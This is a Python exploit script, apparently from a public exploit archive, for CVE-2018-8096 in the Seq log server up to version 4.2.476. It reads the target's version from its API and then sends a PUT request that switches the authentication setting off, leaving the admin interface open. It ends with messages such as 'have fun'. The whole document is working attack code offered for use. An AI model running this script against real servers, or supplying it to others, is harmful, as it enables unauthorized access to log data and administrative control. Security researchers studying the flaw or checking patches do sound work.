# Exploit Author: Daniel Chactoura
# Vendor Homepage: https://getseq.net/
# Software Link: https://getseq.net/Download/All
# Version: <= 4.2.476
# CVE : CVE-2018-8096
# Post Reference: https://medium.com/stolabs/bypass-admin-authentication-on-seq-17f0f9e02732
 
# coding=utf-8
 
#!/bin/python
 
import sys
import requests
 
def verifyArgs(args):
    if len(args) < 2:
        print(&#039;[!] Usage: &#039;+str(args[0])+&#039; https://target&#039;)
        exit(0)
    elif &#039;http&#039; not in str(args[1]):
        print(&#039;&#039;&#039;[!] Missing "https://" !&#039;&#039;&#039;)
        exit(0)
    else:
        return(1)
 
def verifyVersion(url):
    vulnVersions = [&#039;4.2.476&#039;,&#039;4.2.470&#039;,&#039;4.1.17&#039;,&#039;4.1.16&#039;,
                    &#039;4.1.14&#039;,&#039;4.0.60&#039;,&#039;4.0.58&#039;,&#039;3.4.20&#039;,
                    &#039;3.4.18&#039;,&#039;3.4.17&#039;,&#039;3.3.23&#039;,&#039;3.3.22&#039;,
                    &#039;3.3.21&#039;,&#039;3.3.20&#039;,&#039;3.2.16&#039;,&#039;3.1.17&#039;,
                    &#039;3.1.16&#039;,&#039;3.0.30&#039;,&#039;2.4.2&#039;,&#039;2.3.4&#039;,
                    &#039;2.3.3&#039;,&#039;2.2.8&#039;,&#039;2.1.22&#039;,&#039;2.1.21&#039;,
                    &#039;2.0.19&#039;,&#039;1.6.13&#039;,&#039;1.6.12&#039;,&#039;1.6.11&#039;,
                    &#039;1.6.10&#039;,&#039;1.6.9&#039;,&#039;1.6.8&#039;,&#039;1.6.7&#039;,
                    &#039;1.6.6&#039;,&#039;1.6.5&#039;,&#039;1.6.4&#039;,&#039;1.5.19&#039;,
                    &#039;1.5.18&#039;,&#039;1.5.17&#039;,&#039;1.5.16&#039;,&#039;1.4.12&#039;,
                    &#039;1.4.11&#039;,&#039;1.4.10&#039;,&#039;1.4.9&#039;,&#039;1.4.8&#039;,
                    &#039;1.4.7&#039;,&#039;1.4.6&#039;,&#039;1.3.11&#039;,&#039;1.3.10&#039;,
                    &#039;1.3.9&#039;,&#039;1.3.8&#039;]
    u = str(url)
    verifV = requests.get(u+&#039;/api/&#039;)
    verifVJSON = verifV.json()
    ver = str(verifVJSON[&#039;Version&#039;])[:-2]
 
    if ver in vulnVersions:
        print("[+] Seq&#039;s version is potentially vulnerable!")
        return(1)
    else:
        print("[!] Seq&#039;s version is probably not vulnerable!")
        return(0)
 
def bypassAuth(url):
    u = str(url)
    payload = "{&#039;Name&#039;:&#039;isauthenticationenabled&#039;,&#039;Value&#039;:false,&#039;Id&#039;:&#039;setting-isauthenticationenabled&#039;,&#039;Links&#039;:{&#039;Self&#039;:&#039;api/settings/setting-isauthenticationenabled&#039;,&#039;Group&#039;:&#039;api/settings/resources&#039;}}"
    h = {&#039;User-Agent&#039;:&#039;Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0&#039;, &#039;Referer&#039;:u}
    verifM = requests.put(u+&#039;/api/settings/setting-isauthenticationenabled&#039;, data=payload, headers=h)
    verifMCode = str(verifM.status_code)
    if verifMCode == &#039;200&#039;:
        print("[:)] YES! Success! Now, access the url and have fun!")
    else:
        print("[:(] DAMN! This is not your lucky day...")
 
def main():
    try:
        if verifyArgs(sys.argv):
            if verifyVersion(sys.argv[1]):
                bypassAuth(sys.argv[1])
            else:
                c = input(&#039;[?] Do you want to try it anyway? (y/n): &#039;).lower()
                if c == &#039;y&#039;:
                    pass
                elif c == &#039;n&#039;:
                    exit(0)
                else:
                    print(&#039;[!] Invalid choice!&#039;)
                    exit(0)
    except KeyboardInterrupt:
        exit(0)
 
if __name__ == &#039;__main__&#039;:
    main()

